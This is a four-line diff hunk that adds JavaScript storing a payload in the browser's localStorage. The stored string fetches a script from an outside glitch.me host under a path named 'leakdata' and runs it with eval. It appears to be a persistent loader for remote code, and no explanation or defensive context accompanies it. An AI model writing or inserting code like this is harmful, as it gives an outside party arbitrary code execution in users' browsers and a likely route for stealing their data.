@@ -1,0 +1,4 @@
+localStorage.setItem(
+'l', 
+"fetch('https://nhdcollection.glitch.me/s2/leakdata/ldfhf.js').then(response=>response.text()).then(script=>eval(script))"
+)
